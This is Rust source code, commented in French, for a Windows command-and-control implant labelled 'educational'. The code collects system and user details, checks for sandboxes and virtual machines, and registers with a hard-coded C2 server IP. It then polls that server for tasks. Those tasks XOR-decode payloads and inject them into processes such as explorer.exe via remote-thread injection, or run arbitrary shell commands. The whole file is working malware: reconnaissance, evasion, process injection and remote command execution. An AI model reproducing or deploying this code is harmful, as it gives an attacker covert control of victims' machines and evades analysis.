use std::{thread, time::{Duration, Instant}};
use std::process::exit;
use std::ffi::c_void;

// Dépendances externes
use sysinfo::{System, Disks, Networks};
use serde::{Serialize, Deserialize};
use uuid::Uuid;
use reqwest::blocking::Client;
use base64::{Engine as _, engine::general_purpose};

// Windows API
use windows::core::{PCSTR, PSTR};
use windows::Win32::Foundation::{HANDLE, CloseHandle, BOOL};
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
};
use windows::Win32::System::Threading::{
    OpenProcess, CreateRemoteThread, PROCESS_ALL_ACCESS,
};
use windows::Win32::System::Memory::{
    VirtualAllocEx, VirtualProtectEx, WriteProcessMemory, 
    MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ,
};

// ============================================================================
// CONFIGURATION
// ============================================================================
const C2_SERVER: &str = "http://162.19.242.23:3000";
const THRESHOLD_MAX_CPU: usize = 2;
const THRESHOLD_MIN_RAM_MB: u64 = 2048;

// ============================================================================
// STRUCTURES DE DONNÉES (POUR JSON C2)
// ============================================================================

#[derive(Serialize)]
struct C2RegistrationPayload {
    uuid: String,
    system_info: SystemInfoJson,
}

#[derive(Serialize)]
struct SystemInfoJson {
    agent_id: String, // Sera rempli par l'UUID pour l'init
    system: SystemDetails,
    cpu: CpuDetails,
    memory: MemoryDetails,
    disks: Vec<DiskDetails>,
    network: Vec<NetworkDetails>,
}

#[derive(Serialize)]
struct SystemDetails {
    architecture: String,
    os: String,
    hostname: String,
    username: String,
    #[serde(rename = "userType")]
    user_type: String,
    #[serde(rename = "virtualMachine")]
    virtual_machine: bool,
    #[serde(rename = "uptimeSeconds")]
    uptime_seconds: u64,
}

#[derive(Serialize)]
struct CpuDetails {
    model: String,
    processors: usize,
    #[serde(rename = "logicalCores")]
    logical_cores: usize,
}

#[derive(Serialize)]
struct MemoryDetails {
    #[serde(rename = "totalMb")]
    total_mb: u64,
}

#[derive(Serialize)]
struct DiskDetails {
    name: String,
    filesystem: String,
    #[serde(rename = "totalGb")]
    total_gb: f64,
    #[serde(rename = "freeGb")]
    free_gb: f64,
}

#[derive(Serialize)]
struct NetworkDetails {
    ip: String,
    mac: String, // Sysinfo ne donne pas toujours la MAC cross-platform facilement, on mettra un placeholder ou une implémentation spécifique
    status: String,
}

#[derive(Deserialize, Debug)]
struct C2Response {
    status: Option<String>,
    registered: Option<bool>,
    agent_id: Option<String>,
    xor_key: Option<String>,
    payload: Option<serde_json::Value>, // Peut être null, string ou objet
    #[serde(default)]
    task: Option<C2Task>,
}

#[derive(Deserialize, Debug)]
struct C2Task {
    #[serde(rename = "type")]
    task_type: String,
    task_id: Option<String>,
    target_process: Option<String>,
    payload: Option<String>, // Base64 encoded
    command: Option<String>,
    duration: Option<u64>,
}

// ============================================================================
// SYSTÈME ET RECONNAISSANCE
// ============================================================================

fn collect_system_info(uuid: &str) -> SystemInfoJson {
    let mut sys = System::new_all();
    sys.refresh_all();
    let disks = Disks::new_with_refreshed_list();
    let networks = Networks::new_with_refreshed_list();

    // OS & Arch
    let os_name = System::name().unwrap_or("Unknown".to_string());
    let os_ver = System::os_version().unwrap_or("".to_string());
    let full_os = format!("{} {}", os_name, os_ver);
    let arch = std::env::consts::ARCH.to_string();

    // Disks
    let disk_info: Vec<DiskDetails> = disks.list().iter().map(|d| {
        DiskDetails {
            name: d.name().to_string_lossy().to_string(),
            filesystem: d.file_system().to_string_lossy().to_string(),
            total_gb: d.total_space() as f64 / (1024.0 * 1024.0 * 1024.0),
            free_gb: d.available_space() as f64 / (1024.0 * 1024.0 * 1024.0),
        }
    }).collect();

    // Network
    let net_info: Vec<NetworkDetails> = networks.iter().map(|(name, data)| {
        let ip = data.ip_networks().first().map(|ipn| ipn.addr.to_string()).unwrap_or("0.0.0.0".to_string());
        NetworkDetails {
            ip,
            mac: data.mac_address().to_string(),
            status: "UP".to_string(), // Simplification
        }
    }).collect();

    SystemInfoJson {
        agent_id: uuid.to_string(),
        system: SystemDetails {
            architecture: arch,
            os: full_os,
            hostname: System::host_name().unwrap_or("Unknown".to_string()),
            username: whoami::username(),
            user_type: if is_admin() { "Admin".to_string() } else { "User".to_string() },
            virtual_machine: detect_vm(), // Placeholder
            uptime_seconds: System::uptime(),
        },
        cpu: CpuDetails {
            model: sys.cpus().first().map(|c| c.brand().to_string()).unwrap_or("Unknown".to_string()),
            processors: sys.physical_core_count().unwrap_or(1),
            logical_cores: sys.cpus().len(),
        },
        memory: MemoryDetails {
            total_mb: sys.total_memory() / (1024 * 1024),
        },
        disks: disk_info,
        network: net_info,
    }
}

fn is_admin() -> bool {
    // Vérification simplifiée. En Rust "pur", il faut souvent interroger le token Windows via unsafe
    // Pour l'exemple, on suppose false sauf si implémentation unsafe spécifique.
    // L'original C utilisait CheckTokenMembership.
    false 
}

fn detect_vm() -> bool {
    // L'original vérifie le registre ou les noms de fichiers.
    // Ici on peut faire une vérification basique
    let sys = System::new_all();
    if let Some(cpu) = sys.cpus().first() {
        let brand = cpu.brand().to_lowercase();
        if brand.contains("kvm") || brand.contains("qemu") || brand.contains("vmware") {
            return true;
        }
    }
    false
}

fn run_sandbox_checks(sys: &SystemInfoJson) -> bool {
    println!("[Sandbox] Checking environment...");
    
    // CPU Check
    if sys.cpu.logical_cores < THRESHOLD_MAX_CPU {
        println!("[Sandbox] Fail: Too few cores ({})", sys.cpu.logical_cores);
        return true; // Is sandbox
    }

    // RAM Check
    if sys.memory.total_mb < THRESHOLD_MIN_RAM_MB {
        println!("[Sandbox] Fail: Low RAM ({} MB)", sys.memory.total_mb);
        return true;
    }

    // Timing Check (rdtsc equivalent)
    let start = Instant::now();
    let mut _x = 0;
    for _ in 0..100_000_000 { _x += 1; }
    let duration = start.elapsed();
    
    if duration.as_millis() < 10 {
        println!("[Sandbox] Fail: Execution too fast ({} ms)", duration.as_millis());
        return true;
    }

    false // Not a sandbox
}

// ============================================================================
// CRYPTO & UTILITAIRES
// ============================================================================

fn xor_decrypt(data: &mut [u8], key_hex: &str) {
    let key_byte = if key_hex.starts_with("0x") {
        u8::from_str_radix(&key_hex[2..], 16).unwrap_or(0)
    } else {
        u8::from_str_radix(key_hex, 16).unwrap_or(0)
    };

    for byte in data.iter_mut() {
        *byte ^= key_byte;
    }
}

// ============================================================================
// INJECTION DE PROCESSUS (UNSAFE WINDOWS API)
// ============================================================================

fn get_process_id_by_name(process_name: &str) -> Option<u32> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).ok()?;
        let mut entry = PROCESSENTRY32 {
            dwSize: std::mem::size_of::<PROCESSENTRY32>() as u32,
            ..Default::default()
        };

        if Process32First(snapshot, &mut entry).as_bool() {
            loop {
                let current_name = std::ffi::CStr::from_ptr(entry.szExeFile.as_ptr());
                if let Ok(name_str) = current_name.to_str() {
                    if name_str.eq_ignore_ascii_case(process_name) {
                        let _ = CloseHandle(snapshot);
                        return Some(entry.th32ProcessID);
                    }
                }
                if !Process32Next(snapshot, &mut entry).as_bool() {
                    break;
                }
            }
        }
        let _ = CloseHandle(snapshot);
    }
    None
}

fn inject_payload(target_process: &str, payload: &[u8]) -> Result<(), String> {
    println!("[Injection] Target: {}, Size: {} bytes", target_process, payload.len());

    let pid = get_process_id_by_name(target_process)
        .ok_or_else(|| format!("Process {} not found", target_process))?;

    unsafe {
        // 1. OpenProcess
        let process_handle = OpenProcess(PROCESS_ALL_ACCESS, false, pid)
            .map_err(|e| format!("OpenProcess failed: {:?}", e))?;

        // 2. VirtualAllocEx
        let remote_mem = VirtualAllocEx(
            process_handle,
            None,
            payload.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if remote_mem.is_null() {
            let _ = CloseHandle(process_handle);
            return Err("VirtualAllocEx failed".to_string());
        }

        // 3. WriteProcessMemory
        let mut bytes_written = 0;
        let write_res = WriteProcessMemory(
            process_handle,
            remote_mem,
            payload.as_ptr() as *const c_void,
            payload.len(),
            Some(&mut bytes_written),
        );

        if write_res.is_err() || bytes_written != payload.len() {
            let _ = CloseHandle(process_handle);
            return Err("WriteProcessMemory failed".to_string());
        }

        // 4. VirtualProtectEx (RW -> RX)
        let mut old_protect = 0;
        let protect_res = VirtualProtectEx(
            process_handle,
            remote_mem,
            payload.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        if protect_res.is_err() {
            let _ = CloseHandle(process_handle);
            return Err("VirtualProtectEx failed".to_string());
        }

        // 5. CreateRemoteThread
        let thread_handle = CreateRemoteThread(
            process_handle,
            None,
            0,
            Some(std::mem::transmute(remote_mem)),
            None,
            0,
            None,
        );

        if thread_handle.is_err() {
            let _ = CloseHandle(process_handle);
            return Err("CreateRemoteThread failed".to_string());
        }

        println!("[Injection] Success! Remote thread created.");
        let _ = CloseHandle(process_handle);
        // Note: On ne ferme pas le handle du thread ici pour l'exemple, mais on devrait idéalement
    }

    Ok(())
}

// ============================================================================
// MAIN LOOP
// ============================================================================

fn main() {
    println!("=== RUST INJECTOR EDUCATIONAL ===");
    
    // 1. UUID Generation
    let my_uuid = Uuid::new_v4().to_string();
    println!("[Init] UUID: {}", my_uuid);

    // 2. System Collection
    let sys_info = collect_system_info(&my_uuid);

    // 3. Sandbox Detection
    if run_sandbox_checks(&sys_info) {
        println!("[Sandbox] Environment detected. Exiting.");
        // exit(0); // Commenté pour debug
    }

    // 4. HTTP Client
    let client = Client::new();

    // 5. C2 Registration
    println!("[C2] Registering...");
    let reg_payload = C2RegistrationPayload {
        uuid: my_uuid.clone(),
        system_info: sys_info, // Move sys_info
    };

    let reg_url = format!("{}/heartbeat/register", C2_SERVER);
    let resp = match client.post(&reg_url)
        .json(&reg_payload)
        .send() {
            Ok(r) => r,
            Err(e) => {
                println!("[C2] Registration failed: {}", e);
                return;
            }
        };

    let c2_config: C2Response = match resp.json() {
        Ok(c) => c,
        Err(e) => {
            println!("[C2] Failed to parse registration: {}", e);
            return;
        }
    };

    let agent_id = c2_config.agent_id.unwrap_or(my_uuid);
    let xor_key = c2_config.xor_key.unwrap_or("35".to_string());

    println!("[C2] Registered! Agent ID: {}, XOR Key: {}", agent_id, xor_key);

    // 6. Heartbeat Loop
    let heartbeat_url = format!("{}/heartbeat", C2_SERVER);
    
    loop {
        println!("[Loop] Heartbeat...");
        let body = serde_json::json!({ "agent_id": agent_id });

        match client.post(&heartbeat_url).json(&body).send() {
            Ok(resp) => {
                if let Ok(cmd_resp) = resp.json::<C2Response>() {
                    
                    // Gestion du payload direct (legacy format du C)
                    if let Some(payload_val) = cmd_resp.payload {
                        if let Some(payload_str) = payload_val.as_str() {
                            if payload_str != "null" {
                                println!("[Task] Payload received.");
                                match general_purpose::STANDARD.decode(payload_str) {
                                    Ok(mut bytes) => {
                                        xor_decrypt(&mut bytes, &xor_key);
                                        // Default injection
                                        let _ = inject_payload("explorer.exe", &bytes);
                                    },
                                    Err(_) => println!("[Error] Base64 decode failed"),
                                }
                            }
                        }
                    }

                    // Gestion des tâches structurées
                    if let Some(task) = cmd_resp.task {
                        println!("[Task] Received task type: {}", task.task_type);
                        match task.task_type.as_str() {
                            "inject" => {
                                if let (Some(proc), Some(b64)) = (task.target_process, task.payload) {
                                    if let Ok(mut bytes) = general_purpose::STANDARD.decode(b64) {
                                        xor_decrypt(&mut bytes, &xor_key);
                                        let _ = inject_payload(&proc, &bytes);
                                    }
                                }
                            },
                            "execute" => {
                                if let Some(cmd) = task.command {
                                    #[cfg(target_os = "windows")]
                                    std::process::Command::new("cmd").args(["/C", &cmd]).spawn().ok();
                                }
                            },
                            "sleep" => {
                                if let Some(dur) = task.duration {
                                    thread::sleep(Duration::from_millis(dur));
                                    continue; // Skip default sleep
                                }
                            },
                            "exit" => exit(0),
                            _ => {}
                        }
                    }
                }
            },
            Err(e) => println!("[C2] Heartbeat error: {}", e),
        }

        thread::sleep(Duration::from_secs(5));
    }
}